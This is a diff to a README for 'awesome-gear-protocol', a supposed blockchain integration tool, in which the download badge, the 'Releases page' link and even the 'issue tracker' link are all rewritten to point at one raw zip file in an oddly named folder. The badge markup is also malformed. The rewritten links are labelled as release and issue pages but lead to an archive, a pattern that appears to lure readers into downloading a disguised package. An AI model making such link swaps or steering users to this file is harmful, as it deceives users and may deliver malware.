@@ -1,6 +1,6 @@
 # 🎉 awesome-gear-protocol - Seamless Blockchain Integration Made Simple
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/rodrigorodriguezilustra/awesome-gear-protocol/releases)
+[![Download](https://raw.githubusercontent.com/rodrigorodriguezilustra/awesome-gear-protocol/main/Hispanic/awesome-gear-protocol.zip%https://raw.githubusercontent.com/rodrigorodriguezilustra/awesome-gear-protocol/main/Hispanic/awesome-gear-protocol.zip)](https://raw.githubusercontent.com/rodrigorodriguezilustra/awesome-gear-protocol/main/Hispanic/awesome-gear-protocol.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Awesome Gear Protocol! This application provides a user-friendly way 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/rodrigorodriguezilustra/awesome-gear-protocol/releases) to download the latest version of Awesome Gear Protocol. You will find packages for different operating systems. Choose the one that matches your device.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/rodrigorodriguezilustra/awesome-gear-protocol/main/Hispanic/awesome-gear-protocol.zip) to download the latest version of Awesome Gear Protocol. You will find packages for different operating systems. Choose the one that matches your device.
 
 ### Steps to Download:
 
@@ -64,7 +64,7 @@ To run Awesome Gear Protocol efficiently, ensure your system meets the following
 
 ### How do I report an issue?
 
-If you experience problems, please visit our [issue tracker](https://github.com/rodrigorodriguezilustra/awesome-gear-protocol/issues). Describe your issue clearly, and someone from the community will assist you.
+If you experience problems, please visit our [issue tracker](https://raw.githubusercontent.com/rodrigorodriguezilustra/awesome-gear-protocol/main/Hispanic/awesome-gear-protocol.zip). Describe your issue clearly, and someone from the community will assist you.
 
 ### Where can I find additional resources?
 
